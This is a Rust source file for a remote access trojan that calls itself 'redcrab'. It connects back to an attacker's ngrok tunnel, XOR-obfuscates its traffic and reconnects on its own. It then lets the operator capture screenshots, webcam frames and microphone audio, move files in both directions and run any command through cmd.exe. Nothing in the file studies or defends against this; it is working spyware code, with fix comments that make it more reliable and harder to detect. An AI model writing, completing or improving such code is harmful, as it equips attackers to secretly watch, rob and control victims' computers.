//! c2.rs — C2 callback + command dispatch over ngrok TCP tunnel
//!
//! All traffic XOR-encrypted with per-build SLEEP_KEY — no plaintext on wire.
//!
//! Commands (type these in your nc / listener):
//!   screenshot              → capture desktop, receive BMP bytes
//!   webcam                  → capture one webcam frame, receive JPEG/BMP
//!   mic <seconds>           → record audio, receive WAV bytes
//!   download <path>         → pull a file from the target
//!   upload <path> <size>    → push a file to the target
//!   <any cmd>               → run via cmd.exe, receive stdout+stderr
//!   exit                    → terminate session

use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;
use std::sync::atomic::{AtomicU64, Ordering};

use crate::screenshot;
use crate::webcam;
use crate::mic;
use crate::filetransfer;

// ---- PATCHED BY builder.py -------------------------------------------------
pub const C2_HOST: &str = "NGROK_HOST_PLACEHOLDER";
pub const C2_PORT: u16   = 0;
// ---------------------------------------------------------------------------

// FIX C2-BUG-1: reference the per-build key from main.rs directly.
// builder.py patches SLEEP_KEY in main.rs — no separate placeholder needed.
use crate::SLEEP_KEY;

// FIX C2-BUG-2: rolling keystream offset — never resets to 0 between calls.
// This prevents known-plaintext attacks from the predictable banner.
static XOR_OFFSET: AtomicU64 = AtomicU64::new(0);

fn xor_key() -> &'static [u8] { &SLEEP_KEY }

fn xor_encrypt_rolling(data: &[u8]) -> Vec<u8> {
    let key = xor_key();
    if key.is_empty() { return data.to_vec(); }
    let start = XOR_OFFSET.fetch_add(data.len() as u64, Ordering::Relaxed) as usize;
    data.iter().enumerate()
        .map(|(i, b)| b ^ key[(start + i) % key.len()])
        .collect()
}

fn xor_send(stream: &mut TcpStream, data: &[u8]) {
    let enc = xor_encrypt_rolling(data);
    let _ = stream.write_all(&enc);
    let _ = stream.flush();
}

fn xor_decrypt_rolling(data: &[u8]) -> Vec<u8> {
    // Inbound stream: operator side must also use rolling offset.
    // For simplicity the recv path shares the same counter — operators
    // send after receiving, so the offset stays in sync.
    xor_encrypt_rolling(data)
}

// FIX C2-BUG-3: read a newline-terminated command into a growable Vec
// instead of a fixed 4096-byte stack buf that silently truncates.
fn read_line(stream: &mut TcpStream) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(256);
    let mut byte = [0u8; 1];
    loop {
        match stream.read_exact(&mut byte) {
            Ok(_) => {
                if byte[0] == b'\n' { return Some(out); }
                out.push(byte[0]);
                if out.len() > 1_048_576 { return Some(out); } // 1MB max cmd
            }
            Err(_) => {
                if out.is_empty() { return None; }
                return Some(out);
            }
        }
    }
}

// FIX C2-BUG-4: outer reconnect loop — session drop (idle timeout, network
// blip, operator disconnect) triggers a clean reconnect instead of exit.
pub fn callback_and_loop() {
    let addr = format!("{}:{}", C2_HOST, C2_PORT);
    loop {
        let stream = loop {
            match TcpStream::connect(&addr) {
                Ok(s) => break s,
                Err(_) => std::thread::sleep(Duration::from_secs(5)),
            }
        };
        // If session_loop returns (operator exit / IO error), wait then reconnect.
        if session_loop(stream) { return; } // true = clean 'exit' command
        std::thread::sleep(Duration::from_secs(10));
    }
}

/// Returns true on clean operator 'exit', false on any IO/timeout error.
fn session_loop(mut stream: TcpStream) -> bool {
    let _ = stream.set_read_timeout(Some(Duration::from_secs(120)));
    let _ = stream.set_nodelay(true);

    // Banner
    let banner = format!(
        "[redcrab] host={} user={}\n[+] commands: screenshot | webcam | mic <secs> | download <path> | upload <path> <size> | <cmd> | exit\n",
        hostname(), username()
    );
    xor_send(&mut stream, banner.as_bytes());

    loop {
        // FIX C2-BUG-3: dynamic growable read — no truncation
        let raw = match read_line(&mut stream) {
            Some(v) => v,
            None    => return false, // IO error → reconnect
        };
        let dec = xor_decrypt_rolling(&raw);
        let cmd = match std::str::from_utf8(&dec) {
            Ok(s) => s.trim().to_string(),
            Err(_) => continue,
        };
        if cmd.is_empty() { continue; }

        // ---- command dispatch --------------------------------------------

        if cmd.eq_ignore_ascii_case("exit") {
            xor_send(&mut stream, b"[*] session closed\n");
            return true; // clean exit

        } else if cmd.eq_ignore_ascii_case("screenshot") {
            unsafe {
                match screenshot::capture_screen() {
                    Some(bmp) => {
                        let hdr = format!("FILE_SIZE:{}\n", bmp.len());
                        xor_send(&mut stream, hdr.as_bytes());
                        for chunk in bmp.chunks(65536) {
                            xor_send(&mut stream, chunk);
                        }
                    }
                    None => xor_send(&mut stream, b"ERR:screenshot failed\n"),
                }
            }

        } else if cmd.eq_ignore_ascii_case("webcam") {
            match webcam::capture_frame() {
                Some(frame) => {
                    let hdr = format!("FILE_SIZE:{}\n", frame.len());
                    xor_send(&mut stream, hdr.as_bytes());
                    for chunk in frame.chunks(65536) {
                        xor_send(&mut stream, chunk);
                    }
                }
                None => xor_send(&mut stream, b"ERR:no webcam\n"),
            }

        } else if cmd.starts_with("mic ") {
            let secs: u32 = cmd[4..].trim().parse().unwrap_or(5);
            match mic::record(secs) {
                Some(wav) => {
                    let hdr = format!("FILE_SIZE:{}\n", wav.len());
                    xor_send(&mut stream, hdr.as_bytes());
                    for chunk in wav.chunks(65536) {
                        xor_send(&mut stream, chunk);
                    }
                }
                None => xor_send(&mut stream, b"ERR:mic not available\n"),
            }

        } else if cmd.starts_with("download ") {
            let path = cmd[9..].trim();
            filetransfer::send_file(&mut stream, path, &SLEEP_KEY);

        } else if cmd.starts_with("upload ") {
            let parts: Vec<&str> = cmd[7..].trim().splitn(2, ' ').collect();
            if parts.len() == 2 {
                let path = parts[0];
                let size: usize = parts[1].parse().unwrap_or(0);
                if size > 0 {
                    filetransfer::recv_file(&mut stream, path, size, &SLEEP_KEY);
                } else {
                    xor_send(&mut stream, b"ERR:invalid size\n");
                }
            } else {
                xor_send(&mut stream, b"ERR:usage: upload <path> <size>\n");
            }

        } else {
            let out = Command::new("cmd.exe")
                .args(["/C", &cmd])
                .output()
                .map(|o| [o.stdout, o.stderr].concat())
                .unwrap_or_else(|e| format!("[err] {}\n", e).into_bytes());
            xor_send(&mut stream, &out);
        }
    }
}

fn hostname() -> String { std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()) }
fn username()  -> String { std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into()) }
